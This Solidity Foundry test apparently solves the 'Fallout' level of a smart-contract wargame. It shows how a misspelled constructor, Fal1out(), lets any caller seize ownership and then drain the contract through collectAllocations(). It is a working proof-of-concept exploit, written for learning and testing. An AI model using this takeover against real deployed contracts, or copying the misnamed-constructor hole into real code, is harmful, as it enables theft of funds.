pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import {Fallout} from "../src/02-fallout.sol";

// function name wrong, everyone can call Fal1out()
contract Fallout02Test is Test {
    Fallout fout;

    function setUp() public {
        console.log(unicode"🧪 Setup Fallout...");
        address bob = mkaddr("bob");
        vm.prank(bob);
        fout = new Fallout();
    }

    function testFallout() public {
        console.log(unicode"🧪 Cracking Fallout...");
        address alice = mkaddr("alice");
        vm.deal(alice, 100 ether);
        vm.startPrank(alice);
        fout.Fal1out{value: 1 ether}();
        fout.collectAllocations();
        vm.stopPrank();
        emit log_named_address("Owner change to: ", fout.owner());
    }

    // @notice function to create address, and label it
    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
